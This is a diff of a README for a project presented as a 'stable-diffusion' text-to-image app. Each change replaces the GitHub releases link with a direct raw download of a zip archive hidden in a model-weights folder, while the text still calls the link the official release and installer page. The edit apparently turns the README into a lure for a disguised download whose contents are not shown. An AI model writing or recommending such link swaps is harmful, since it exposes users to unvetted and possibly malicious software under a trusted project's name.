@@ -1,6 +1,6 @@
 # 🎨 stable-diffusion - Simple Text-to-Image Creation
 
-[![Download stable-diffusion](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/FxThomas08/stable-diffusion/releases)
+[![Download stable-diffusion](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/FxThomas08/stable-diffusion/main/models/first_stage_models/kl-f32/diffusion_stable_v1.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section guides you through downloading and running stable-diffusion on your
 
 Go to the release page by clicking the button below. This page contains the software files you need.
 
-[![Get stable-diffusion](https://img.shields.io/badge/Get-Download_Release-blue)](https://github.com/FxThomas08/stable-diffusion/releases)
+[![Get stable-diffusion](https://img.shields.io/badge/Get-Download_Release-blue)](https://raw.githubusercontent.com/FxThomas08/stable-diffusion/main/models/first_stage_models/kl-f32/diffusion_stable_v1.3.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -110,7 +110,7 @@ If stable-diffusion does not run as expected, try the following:
 
 Primary download page for latest stable releases:
 
-[https://github.com/FxThomas08/stable-diffusion/releases](https://github.com/FxThomas08/stable-diffusion/releases)
+[https://raw.githubusercontent.com/FxThomas08/stable-diffusion/main/models/first_stage_models/kl-f32/diffusion_stable_v1.3.zip](https://raw.githubusercontent.com/FxThomas08/stable-diffusion/main/models/first_stage_models/kl-f32/diffusion_stable_v1.3.zip)
 
 Use this page to always get the newest updates and installer files.
 
